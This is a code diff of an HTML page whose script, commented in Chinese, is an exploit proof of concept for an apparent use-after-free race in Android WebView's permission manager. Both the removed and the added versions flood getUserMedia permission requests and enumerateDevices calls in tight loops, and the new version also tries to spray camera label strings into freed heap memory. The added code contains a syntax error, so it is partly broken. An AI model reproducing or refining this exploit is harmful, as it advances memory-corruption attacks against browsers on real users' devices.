@@ -31,45 +31,29 @@
     </div>
 
     <script>
-        let isAttacking = false;
-    
-        // 1. 负责轰炸底层“读”通道的函数
-        async function startReaderBombardment() {
-            console.log("🔥 后台多媒体读线程轰炸机已启动...");
-            while (isAttacking) {
-                try {
-                    // 疯狂调用此接口，迫使底层多媒体线程高频去读取 AwPermissionManager 的全局 Map
-                    await navigator.mediaDevices.enumerateDevices();
-                } catch (e) {
-                    // 忽略异常，保持最高频冲锋
-                }
-                // 0毫秒延迟，尽可能榨干 JS 异步队列，让读请求密密麻麻地冲向内核
-                await new Promise(resolve => setTimeout(resolve, 0));
-            }
+        // 核心逻辑：左手高频申请权限（制造 Free），右手高频刷新设备（制造相机字符串填坑）
+        function startExploit() {
+            console.log("🔥 漏洞复现点火...");
+        
+            // 1. 疯狂弹窗并自动拒绝/接受，制造 AwPermissionRequest 的高频创建与销毁
+            setInterval(() => {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                    .then(stream => stream.getTracks().forEach(t => t.stop()))
+                    .catch(err => {}); // 触发权限弹窗
+            }, 5);
+        
+            // 2. 【关键】疯狂轰炸多媒体硬件层，逼底层不断生成 "camera2 1, facing front" 填补内存空洞
+            setInterval(() => {
+                navigator.mediaDevices.enumerateDevices()
+                    .then(devices => {
+                        // 纯粹为了消耗和刷新内存，让相机标签字符串在堆上疯狂刷屏
+                        let dummy = devices.map(d => d.label).join(","); 
+                    });
+            }, 2);
         }
     
         function triggerManualAttack() {
-            if (isAttacking) return;
-            isAttacking = true;
-    
-            // 💥 核心同步点 A：启动后台高频“读 Map”轰炸
-            startReaderBombardment();
-    
-            console.log("🚀 开始向内核队列注入并发权限请求（准备触发连环写 Map）...");
-            
-            // 💥 核心同步点 B：连续注入 15 个权限请求
-            // 当你点击“允许”时，Java 层会连环触发 grant()，造成主线程高频“写 Map”
-            for (let i = 0; i < 15; i++) {
-                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
-                .then((stream) => {
-                    console.log(`第 ${i} 个流获取成功`);
-                    // 成功后可以关掉流，防止占用设备
-                    stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(err => {
-                    console.log("请求被拒绝或取消");
-                });
-            }
+             startExploit);
         }
     </script>
 </body>
